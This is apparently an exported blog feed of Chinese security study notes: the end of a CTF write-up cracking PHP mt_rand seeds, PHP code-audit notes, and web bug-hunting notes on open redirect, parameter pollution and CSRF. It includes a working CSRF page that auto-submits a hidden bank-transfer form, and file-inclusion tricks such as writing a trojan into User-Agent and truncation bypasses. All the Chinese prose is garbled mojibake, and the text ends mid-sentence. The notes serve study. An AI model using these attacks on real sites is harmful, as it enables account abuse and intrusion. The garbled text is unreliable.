alt="image9.png"></p><p>å¯ä»¥çœ‹åˆ°çˆ†å‡ºäº†å¤šä¸ªå¯èƒ½çš„ç§å­ï¼Œç„¶åç”¨phpå¯¹å…¶è¿›è¡Œä¸€ä¸€å°è¯•</p><p><code>&lt;?php</code></p><p><code>error_reporting(0);</code></p><p><code>include(&quot;flag.php&quot;);</code></p><p><code>$data=array(2842768692,119863145,1188895974,1439248936,2480548275,3087409991,4059342533,4224933991);</code></p><p><code>for ($i=0; $i &lt; count($data); $i++) &#123;</code></p><p><code>mt_srand($data[$i]);</code></p><p><code>mt_rand();</code></p><p><code>echo mt_rand()+mt_rand();</code></p><p><code>echo &quot;/&quot;;</code></p><p><code>&#125;</code></p><p><code>?&gt;</code></p><p>è¿è¡Œphpå¾—åˆ°ä¸‹åˆ—å€¼</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image10.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image10.png"></p><p>å†å¯¹å…¶ä¸€ä¸€å°è¯•</p><p><img src="/2023/01/23/ctfshow-web-ru-men-bao-po/image11.png" class="lazyload placeholder" data-srcset="/2023/01/23/ctfshow-web-ru-men-bao-po/image11.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image11.png"></p><p>å¾—åˆ°flag</p><p><strong>çŸ¥è¯†ç‚¹ï¼š</strong></p><p>php_mt_seedä¸‹è½½åœ°å€ï¼š<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>mt_rand()é¢å¯¹åŒä¸€ç§å­åœ¨ä¸€ä¸ªå‡½æ•°å¤šæ¬¡è°ƒç”¨çš„å€¼éƒ½ä¸ç›¸åŒï¼Œæ‰€ä»¥ä¸èƒ½å°†mt_rand()+mt_rand()å•çº¯çœ‹ä½œmt_rand()*2</p><p><strong>çŸ¥è¯†ç‚¹æ±‡æ€»ï¼š</strong></p><p><strong>mt_scrand(seed)ä¸mt_rand()ä¼ªéšæœºæ•°ç”Ÿæˆ</strong></p><p>mt_scrand(seed)è¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼Œæ˜¯é€šè¿‡åˆ†å‘seedç§å­ï¼Œç„¶åç§å­æœ‰äº†åï¼Œé mt_rand()ç”Ÿæˆéšæœºæ•°ã€‚ æç¤ºï¼šä» PHP 4.2.0 å¼€å§‹ï¼Œéšæœºæ•°ç”Ÿæˆå™¨è‡ªåŠ¨æ’­ç§ï¼Œå› æ­¤æ²¡æœ‰å¿…è¦ä½¿ç”¨è¯¥å‡½æ•°å› æ­¤ä¸éœ€è¦æ’­ç§ï¼Œå¹¶ä¸”å¦‚æœè®¾ç½®äº† seedå‚æ•°ç”Ÿæˆçš„éšæœºæ•°å°±æ˜¯ä¼ªéšæœºæ•°ï¼Œæ„æ€å°±æ˜¯æ¯æ¬¡ç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¸€æ ·çš„</p><p>php_mt_seedä¸‹è½½åœ°å€ï¼š<a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a></p><p>mt_rand()é¢å¯¹åŒä¸€ç§å­åœ¨ä¸€ä¸ªå‡½æ•°å¤šæ¬¡è°ƒç”¨çš„å€¼éƒ½ä¸ç›¸åŒï¼Œæ‰€ä»¥ä¸èƒ½å°†mt_rand()+mt_rand()å•çº¯çœ‹ä½œmt_rand()*2</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šä»£ç å®¡è®¡ã€‹é˜…è¯»ç¬”è®°</title>
      <link href="/2022/12/23/dai-ma-shen-ji-27f31c56ad1f449fb4d542f939bec05b/"/>
      <url>/2022/12/23/dai-ma-shen-ji-27f31c56ad1f449fb4d542f939bec05b/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€Šä»£ç å®¡è®¡ã€‹"><a href="#ã€Šä»£ç å®¡è®¡ã€‹" class="headerlink" title="ã€Šä»£ç å®¡è®¡ã€‹"></a>ã€Šä»£ç å®¡è®¡ã€‹</h1><p>å¤‡æ³¨: phpä»£ç å®¡è®¡<br>å¼€å§‹æ—¥æœŸ: December 23, 2022 5:09 PM<br>çŠ¶æ€: å·²å®Œæˆ</p><h1 id="å®¡è®¡æ€è·¯"><a href="#å®¡è®¡æ€è·¯" class="headerlink" title="å®¡è®¡æ€è·¯"></a>å®¡è®¡æ€è·¯</h1><ol><li>æ ¹æ®æ•æ„Ÿå…³é”®å­—å›æº¯å‚æ•°ä¼ é€’è¿‡ç¨‹</li><li>æŸ¥æ‰¾å¯æ§å˜é‡ï¼Œæ­£å‘è¿½è¸ªå˜é‡ä¼ é€’è¿‡ç¨‹</li><li>å¯»æ‰¾æ•æ„ŸåŠŸèƒ½ç‚¹ï¼Œé€šè¯»åŠŸèƒ½ç‚¹ä»£ç </li><li>ç›´æ¥é€šè¯»å…¨æ–‡ä»£ç </li></ol><p>ä¸€èˆ¬æµç¨‹ï¼š</p><ol><li>æ‹¿åˆ°æºä»£ç æ–‡ä»¶å¤¹ï¼Œå…ˆä»æ ¹ç›®å½•å¼€å§‹ï¼ŒæŸ¥æ‰¾æœ‰æ²¡æœ‰æ•æ„Ÿæ–‡ä»¶åï¼Œå¦‚ï¼š</li></ol><ul><li>indexï¼ŒAPIï¼Œinclude</li><li>é…ç½®æ–‡ä»¶ï¼šconfig</li><li>å‡½æ•°é›†æ–‡ä»¶ï¼šfunctionï¼Œcommon</li><li>å®‰å…¨è¿‡æ»¤æ–‡ä»¶ï¼šfilterï¼Œsafeï¼Œcheck</li></ul><p>ç„¶åå†ä¸€å±‚ä¸€å±‚è¿™æ ·å­é€šè¯»ä¸€ä¸‹æ–‡ä»¶åã€‚</p><p>æ•æ„Ÿå‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>()   <span class="comment">#è¿‡æ»¤å‡½æ•°ï¼Œå¯¹å•å¼•å·ï¼ŒåŒå¼•å·ï¼ŒNULLå­—ç¬¦ï¼Œä»¥åŠæ–œæ†è¿›è¡Œè½¬ä¹‰è¿‡æ»¤</span></span><br><span class="line">mysql_real_escape_string <span class="comment">#è¿‡æ»¤å‡½æ•°ï¼Œè¿‡æ»¤\x00,\n,\r,\,&#x27;,&quot;,\x1a</span></span><br></pre></td></tr></table></figure><h1 id="PHPé…ç½®"><a href="#PHPé…ç½®" class="headerlink" title="PHPé…ç½®"></a>PHPé…ç½®</h1><p>PHP_INI_*å¸¸é‡çš„å®šä¹‰</p><table><thead><tr><th>å¸¸é‡</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>PHP_INI_USER</td><td>å¯åœ¨PHPè„šæœ¬æˆ–windowsæ³¨å†Œè¡¨ä¸­è®¾ç½®</td></tr><tr><td>PHP_INI_PERDIR</td><td>å¯åœ¨php.ini,.htaccessæˆ–httpd,confä¸­è®¾ç½®</td></tr><tr><td>PHP_INI_SYSTEM</td><td>å¯åœ¨php.iniæˆ–httpd,confä¸­è®¾ç½®</td></tr><tr><td>PHP_INI_ALL</td><td>å¯åœ¨ä»»ä½•åœ°æ–¹è®¾ç½®</td></tr><tr><td>php.ini only</td><td>ä»…å¯åœ¨php.iniä¸­è®¾ç½®</td></tr></tbody></table><ol><li>register_globalï¼ˆå…¨å±€æ³¨å†Œå¼€å…³ï¼‰</li></ol><p>é€‚ç”¨ç‰ˆæœ¬ï¼šphp&lt;5.4</p><p>è¯¥é€‰é¡¹è®¾ç½®ä¸ºonæ—¶ï¼Œä¼šç›´æ¥æŠŠç”¨æˆ·GETï¼ŒPOSTç­‰æ–¹å¼æäº¤ä¸Šæ¥çš„å‚æ•°ç›´æ¥æ³¨å†Œæˆå…¨å±€å˜é‡å¹¶åˆå§‹åŒ–å€¼ä¸ºå‚æ•°å¯¹åº”çš„å€¼ï¼Œå¦‚æäº¤ä¸€ä¸ª?a&#x3D;xxxï¼Œåˆ™å¯ä»¥ç›´æ¥ä½¿ç”¨$aä»£æ›¿$_GET[a],</p><ol><li>allow_url_includeï¼ˆæ˜¯å¦å…è®¸åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼‰</li></ol><p>é€‚ç”¨ç‰ˆæœ¬ï¼šphp&lt;5.2ä¹‹åé»˜è®¤å…³é—­</p><ol><li>magic_quotes_gpcä¸magic_quotes_gpc ï¼ˆçš†ä¸ºé­”æœ¯å¼•å·è‡ªåŠ¨è¿‡æ»¤ï¼‰</li></ol><p>é€‚ç”¨ç‰ˆæœ¬ï¼šphp&lt;5.4</p><p>è‡ªåŠ¨è¿‡æ»¤å•å¼•å·ï¼ŒåŒå¼•å·ï¼Œåæ–œæ å’ŒNULLï¼ŒåŒºåˆ«åœ¨äºå‰è€…é’ˆå¯¹GET,POST,COOKIEï¼›è€Œåè€…é’ˆå¯¹ä»æ•°æ®åº“æˆ–è€…æ–‡ä»¶ä¸­è·å–çš„æ•°æ®è¿›è¡Œè¿‡æ»¤</p><ol><li>å®‰å…¨æ¨¡å¼</li></ol><p>é€‚ç”¨ç‰ˆæœ¬ï¼šphp&lt;5.4</p><h1 id="æ¼æ´æŒ–æ˜"><a href="#æ¼æ´æŒ–æ˜" class="headerlink" title="æ¼æ´æŒ–æ˜"></a>æ¼æ´æŒ–æ˜</h1><h2 id="1-sqlæ³¨å…¥"><a href="#1-sqlæ³¨å…¥" class="headerlink" title="1.sqlæ³¨å…¥"></a>1.sqlæ³¨å…¥</h2><ul><li>æ³¨æ„ä¸æ•°æ®åº“äº¤äº’çš„å‡½æ•°ï¼Œè¯­å¥ï¼Œç„¶åæŸ¥çœ‹ä»–ä»¬çš„è¿‡æ»¤æƒ…å†µ</li></ul><h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><p>å…³é”®å­—ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET NAMES</span><br><span class="line">character_set_client=gbk</span><br><span class="line">mysql_set_charset</span><br></pre></td></tr></table></figure><h2 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2.XSS"></a>2.XSS</h2><p>æ‰¾å¸¦æœ‰å‚æ•°çš„è¾“å‡ºå‡½æ•°ï¼Œç„¶åæ ¹æ®è¾“å‡ºå‡½æ•°å¯¹è¾“å…¥å†…å®¹å›æº¯è¾“å…¥å‚æ•°</p><h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3.CSRF"></a>3.CSRF</h2><p>tokenéªŒè¯ï¼štokenä¸€èˆ¬ä¸ºè®¿é—®ä¸Šä¸€ä¸ªé¡µé¢å¾—åˆ°çš„ï¼Œå¦‚æœæ²¡æœ‰è®¿é—®ä¸Šä¸€ä¸ªé¡µé¢è€Œæ˜¯é€šè¿‡è·³è½¬è€Œæ¥çš„ï¼Œåˆ™éªŒè¯å¤±è´¥</p><h2 id="4-æ–‡ä»¶æ“ä½œæ¼æ´"><a href="#4-æ–‡ä»¶æ“ä½œæ¼æ´" class="headerlink" title="4.æ–‡ä»¶æ“ä½œæ¼æ´"></a>4.æ–‡ä»¶æ“ä½œæ¼æ´</h2><h3 id="æ–‡ä»¶åŒ…å«ï¼š"><a href="#æ–‡ä»¶åŒ…å«ï¼š" class="headerlink" title="æ–‡ä»¶åŒ…å«ï¼š"></a>æ–‡ä»¶åŒ…å«ï¼š</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>()</span><br><span class="line"><span class="keyword">include_once</span>()</span><br><span class="line"><span class="keyword">require</span>()</span><br><span class="line"><span class="keyword">require_once</span>()</span><br></pre></td></tr></table></figure><p>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼šå¯ä»¥åŒ…å«è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åŒ…å«æœ¬åœ°çš„æ—¥å¿—ï¼Œå¦‚linuxåœ¨User-Agentå¤´å†™å…¥æœ¨é©¬ï¼Œç„¶ååŒ…å«&#x2F;proc&#x2F;self&#x2F;environ</p><p>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼šå¯ä»¥ç›´æ¥åŒ…å«ä¸€ä¸ª1å«æœ‰æœ¨é©¬çš„.txtã€‚</p><p>é€šå¸¸ä¼šä½¿ç”¨æˆªæ–­è¿›è¡Œç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[a].<span class="string">&quot;.php&quot;</span></span><br></pre></td></tr></table></figure><p>å¦‚ï¼š</p><ol><li>%00æˆªæ–­ï¼Œphp&lt;5.3</li><li>Windowsä¸‹ä½¿ç”¨240ä¸ª.æˆ–.åŠ &#x2F;ï¼ŒLinuxä¸‹ä½¿ç”¨2038ä¸ª.&#x2F;è¿›è¡Œæˆªæ–­</li><li>è¿œç¨‹åŒ…å«æ—¶ä½¿ç”¨?è¿›è¡Œç»•è¿‡ï¼Œ?url&#x3D;xxx.com&#x2F;1.txt?</li></ol><h3 id="æ–‡ä»¶è¯»å–ï¼ˆä¸‹è½½ï¼‰æ¼æ´"><a href="#æ–‡ä»¶è¯»å–ï¼ˆä¸‹è½½ï¼‰æ¼æ´" class="headerlink" title="æ–‡ä»¶è¯»å–ï¼ˆä¸‹è½½ï¼‰æ¼æ´"></a>æ–‡ä»¶è¯»å–ï¼ˆä¸‹è½½ï¼‰æ¼æ´</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ–‡ä»¶è¯»å–å‡½æ•°åˆ—è¡¨</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight</span>()</span><br><span class="line"><span class="title function_ invoke__">forpen</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgetss</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"><span class="title function_ invoke__">parse_ini_file</span>()</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line">é™¤äº†ä½¿ç”¨è¿™äº›æ­£å¸¸çš„è¯»å–æ–‡ä»¶çš„å‡½æ•°ä¹‹å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ <span class="keyword">include</span>+ä¼ªåè®® æ¥è¯»å–æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>() <span class="comment">#å”¯ä¸€ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å‡½æ•°ï¼Œæ‰€ä»¥åœ¨ä»£ç å®¡è®¡æ—¶å¯ä»¥ç›´æ¥æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°ï¼Œç„¶åå†çœ‹èƒ½ä¸èƒ½ç»•è¿‡</span></span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶åˆ é™¤"><a href="#æ–‡ä»¶åˆ é™¤" class="headerlink" title="æ–‡ä»¶åˆ é™¤"></a>æ–‡ä»¶åˆ é™¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">unlink</span>()  <span class="comment">#æ–‡ä»¶åˆ é™¤</span></span><br></pre></td></tr></table></figure><h2 id="å˜é‡è¦†ç›–æ¼æ´"><a href="#å˜é‡è¦†ç›–æ¼æ´" class="headerlink" title="å˜é‡è¦†ç›–æ¼æ´"></a>å˜é‡è¦†ç›–æ¼æ´</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>() <span class="comment">#ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</span></span><br><span class="line"><span class="title function_ invoke__">parse_str</span>() <span class="comment">#å°†å­—ç¬¦ä¸²è§£ææˆå¤šä¸ªå˜é‡</span></span><br><span class="line"><span class="title function_ invoke__">import_request_variables</span>() <span class="comment">#php&lt;5.4ï¼Œå…¨å±€å˜é‡æ³¨å†Œ</span></span><br><span class="line"><span class="variable">$$a</span> <span class="comment">#å¯å˜å˜é‡</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯»ä¹¦ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ŠWebæ¼æ´æœç´¢ã€‹é˜…è¯»ç¬”è®°</title>
      <link href="/2022/12/23/web-lou-dong-sou-suo-676da3cd74cd454595e5beca08946d17/"/>
      <url>/2022/12/23/web-lou-dong-sou-suo-676da3cd74cd454595e5beca08946d17/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€ŠWebæ¼æ´æœç´¢ã€‹"><a href="#ã€ŠWebæ¼æ´æœç´¢ã€‹" class="headerlink" title="ã€ŠWebæ¼æ´æœç´¢ã€‹"></a>ã€ŠWebæ¼æ´æœç´¢ã€‹</h1><p>å¤‡æ³¨: è®²äº†ä¸€ä¸‹è·ŸæŒ–æ¼æ´ç›¸å…³çš„å»ºè®®ï¼Œè¿˜æœ‰ä¸€äº›å®ä¾‹<br>å¼€å§‹æ—¥æœŸ: December 23, 2022 5:09 PM<br>çŠ¶æ€: å·²å®Œæˆ</p><h1 id="å¼€æ”¾å¼é‡å®šå‘"><a href="#å¼€æ”¾å¼é‡å®šå‘" class="headerlink" title="å¼€æ”¾å¼é‡å®šå‘"></a>å¼€æ”¾å¼é‡å®šå‘</h1><aside>ğŸ’¡ é‡å®šå‘çš„å®ç°ä¸€èˆ¬æ˜¯é€šè¿‡urlå‚æ•°ï¼ŒHTML<meta>åˆ·æ–°æ ‡ç­¾ï¼ŒDOMä¸­çš„windowå¯¹è±¡çš„locationå±æ€§å®ç°çš„ã€‚</aside><p>ç®€è¿°ï¼šé€šè¿‡æ”¹å˜GETè¯·æ±‚ä¸­åŒ…å«å¯ä»¥æ§åˆ¶çš„é‡å®šå‘ç½‘å€ï¼Œå°†ç½‘ç«™é‡å®šå‘åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°æ–¹ã€‚</p><p>æŒ–æ˜æ€è·¯ï¼š</p><p>é‡ç‚¹å…³æ³¨ç‰¹å®šåç§°çš„urlå‚æ•°ï¼Œå¦‚ï¼šurl&#x3D;,redirect&#x3D;,next&#x3D;,r&#x3D;,u&#x3D;</p><p>æœ‰æ—¶å€™ç½‘ç«™ä¼šå¯¹é‡å®šå‘çš„é“¾æ¥åšä¸€äº›éªŒè¯ï¼Œå¯èƒ½æ˜¯åªèƒ½é‡å®šå‘åˆ°æœ¬ç½‘ç«™ï¼Œæ­¤æ—¶å°±éœ€è¦ç»“åˆå…¶ä»–æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼Œæ¯”å¦‚é‡å®šå‘åˆ°ä¸€ä¸ªå¯ä»¥è‡ªç”±ç¼–è¾‘jsä»£ç çš„ç•Œé¢ï¼Œè¿™æ—¶å€™å†è¿›è¡Œä¸€ä¸ªé‡å®šå‘ï¼Œå°±å¯ä»¥è¾¾åˆ°æˆ‘ä»¬é¢„æœŸçš„ç»“æœã€‚</p><p>æœ‰æ—¶å€™æˆ‘ä»¬å¯ä»¥æ§åˆ¶é‡å®šå‘ç½‘å€çš„ä¸€éƒ¨åˆ†ï¼Œæ¯”å¦‚ç»“å°¾ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç»“å°¾æ„é€ é‡å®šå‘é“¾æ¥ï¼Œå› ä¸ºDNSæ˜¯æŒ‰ç…§åŸŸåæ ‡è®°å³ä¾§ä¼˜å…ˆçš„åŸåˆ™è¿›è¡ŒæŸ¥è¯¢</p><h1 id="HPPï¼ˆhttpå‚æ•°æ±¡æŸ“ï¼‰"><a href="#HPPï¼ˆhttpå‚æ•°æ±¡æŸ“ï¼‰" class="headerlink" title="HPPï¼ˆhttpå‚æ•°æ±¡æŸ“ï¼‰"></a>HPPï¼ˆhttpå‚æ•°æ±¡æŸ“ï¼‰</h1><p>ç®€è¿°ï¼šæˆ‘ä»¬çš„è¯·æ±‚è¿‡ç¨‹ä¸­ï¼Œå¯¹httpæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œè¿™äº›é¢å¤–å‚æ•°å¹²æ‰°äº†åç«¯ä»£ç å¯¹æ­£å¸¸å‚æ•°çš„å¤„ç†ï¼Œä»è€Œå¯¼è‡´äº†éé¢„æœŸçš„ç»“æœã€‚</p><aside>ğŸ’¡ æœåŠ¡å™¨ç«¯HPPPä¸å®¢æˆ·ç«¯HPPçš„åŒºåˆ«ï¼šå¯¹httpè¿›è¡Œå‚æ•°æ±¡æŸ“ä¹‹åæ˜¯å¦åœ¨æœ‰ä¸­é—´çš„åé¦ˆã€‚æœåŠ¡å™¨ç«¯HPPåªèƒ½çœ‹åˆ°åç«¯ä»£ç è¿è¡Œä¹‹åçš„ç»“æœï¼Œè€Œçœ‹ä¸åˆ°ä¸­é—´çš„è¿‡ç¨‹ã€‚ï¼ˆä¸ç”¨å¤ªçº ç»“åŒºåˆ«ï¼‰</aside><p>æŒ–æ˜æ€è·¯ï¼š</p><ul><li>å¯»æ‰¾ä¸å…¶ä»–æœåŠ¡ç›¸å…³è”çš„é“¾æ¥ï¼Œå› ä¸ºè¿™äº›é“¾æ¥åœ¨è·³è½¬çš„æ—¶å€™å¯èƒ½ä¼šä¼ é€’ä¸€äº›å¯æ§çš„å‚æ•°ï¼Œæˆ‘ä»¬é€šè¿‡&amp;xxx&#x3D;xxxæ·»åŠ æ–°çš„å‚æ•°ï¼ˆæœ‰æ—¶å€™éœ€è¦å¯¹&amp;è¿›è¡Œurlç¼–ç ä¸º%26ï¼Œæ”¹å€¼è¢«htmlç¼–ç åä¸º&amp;ampï¼›ï¼‰ã€‚</li><li>åœ¨æŒ–æ˜é€»è¾‘æ¼æ´æ—¶å¯ä»¥è¯•ä¸€ä¸‹å‚æ•°æ±¡æŸ“ï¼Œæ·»åŠ ç›¸åŒå‚æ•°ç»•è¿‡</li></ul><h1 id="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"><a href="#CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰" class="headerlink" title="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰"></a>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰</h1><p>ç®€è¿°ï¼šç”¨æˆ·åœ¨ä¸€ä¸ªç½‘ç«™ä¸Šç™»å½•è‡ªå·±çš„è´¦å·ï¼Œæˆ‘ä»¬é€šè¿‡å…¶ä»–ç½‘ç«™Aå»é‡å®šå‘åˆ°è¿™ä¸ªç½‘ç«™Bï¼Œå¹¶ä»¥ç”¨æˆ·çš„èº«ä»½å‘é€è¯·æ±‚ã€‚</p><p>æŒ–æ˜æ€è·¯ï¼š</p><ul><li>GETè¯·æ±‚â†’ç›´æ¥åœ¨urlæ³¨å…¥è¦å‘é€çš„å‚æ•°</li><li>POSTè¯·æ±‚â†’åå°å¯èƒ½ç”¨çš„requestæ¥å—å‚æ•°ï¼ŒåŒæ ·åœ¨urlæ³¨å…¥å‚æ•°ã€‚å¦‚æœæ˜¯åå°æ˜¯POSTè¯·æ±‚æ¥å—å‚æ•°ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç½‘ç«™Aå»æ„é€ ä¸€ä¸ªè¡¨å•ï¼Œå¦‚ï¼š</li></ul><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">ã€€ã€€<span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">ã€€ã€€ã€€ã€€ã€€ã€€<span class="keyword">function</span> <span class="title function_">steal</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">ã€€ã€€ã€€ã€€ã€€ã€€&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          ã€€ã€€ã€€ã€€ iframe = <span class="variable language_">document</span>.<span class="property">frames</span>[<span class="string">&quot;steal&quot;</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">ã€€ã€€     ã€€ã€€      iframe.<span class="property">document</span>.<span class="title class_">Submit</span>(<span class="string">&quot;transfer&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">ã€€ã€€ã€€ã€€ã€€ã€€&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">ã€€ã€€ã€€ã€€</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">ã€€ã€€<span class="language-xml"><span class="tag">&lt;<span class="name">body</span> <span class="attr">Î¿nlÎ¿ad</span>=<span class="string">&quot;steal()&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;steal&quot;</span> <span class="attr">display</span>=<span class="string">&quot;none&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">name</span>=<span class="string">&quot;transfer&quot;</span>ã€€<span class="attr">action</span>=<span class="string">&quot;http://www.myBank.com/Transfer.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;toBankId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;money&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€ã€€ã€€ã€€ã€€<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€ã€€ã€€<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">ã€€ã€€<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>å‘ç½‘ç«™Bå‘é€è¯·æ±‚ï¼Œè¿™é‡Œçš„type&#x3D;â€hiddenâ€å¯ä»¥éšè—æ 